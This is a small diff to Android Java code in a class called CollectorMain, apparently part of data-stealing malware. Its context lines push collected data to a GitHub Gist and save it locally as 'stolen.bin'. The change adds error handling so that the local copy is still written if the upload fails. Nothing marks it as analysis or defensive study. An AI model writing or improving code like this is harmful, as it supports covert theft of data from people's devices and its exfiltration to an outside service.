@@ -73,6 +73,10 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 			new GistService(ghc).updateGist(gst);
 			Log.d("gist","updated");
 			sb.edit().clear().commit();
+		} catch (IOException e) {
+			e.printStackTrace(System.out);
+		}
+		try{
 			fos=new FileOutputStream(new File(getFilesDir(),"stolen.bin"));
 			fos.write(sb.toBytes());
 		} catch (IOException e) {
